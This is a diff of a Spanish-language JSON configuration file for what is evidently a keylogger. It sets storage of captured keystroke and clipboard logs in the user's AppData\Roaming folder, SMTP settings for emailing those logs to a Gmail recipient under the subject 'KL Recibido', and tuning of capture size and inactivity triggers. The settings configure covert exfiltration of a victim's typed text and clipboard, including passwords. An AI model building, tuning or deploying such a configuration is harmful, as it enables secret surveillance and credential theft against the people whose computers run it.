@@ -1,11 +1,11 @@
 {
     "configuracion":
     {
-        "remitente": "correo@gmail.com",
-        "remitente_psw": "contraseña generada por app",
-        "destinatarios": ["destinatario@gmail.com"],
-        "asunto_correo": "Prueba de Correo",
-        "cuerpo_correo": "Esta es una Prueba del Servicio de Correo EmailMessage Usando SMTP en Python.",
+        "remitente": "remitente@gmail.com",
+        "remitente_psw": "token 16 digitos",
+        "destinatarios": ["correo@gmail.com"],
+        "asunto_correo": "KL Recibido",
+        "cuerpo_correo": "-Descripcion...",
         "nombre_log_pulsaciones_adjunto": "Pulsaciones Recibidas",
         "nombre_log_portapapeles_adjunto": "Portapapeles Obtenido",
         "puerto": 587,
@@ -15,10 +15,11 @@
         "ruta_log": "C:\\Users\\%username%\\AppData\\Roaming\\",
         "nombre_log_pulsaciones": "",
         "nombre_log_portapapeles": "",
-        "caracteres_maximos": 1000,
+        "caracteres_maximos": 2500,
         "horas_inactivo": 0,
-        "minutos_inactivo": 10,
+        "minutos_inactivo": 3,
         "segundos_inactivo": 0,
-        "hora_programada": [17,0,0]
+        "hora_programada": [0,0,0],
+        "enviar_periodicamente": 0
     }
 }
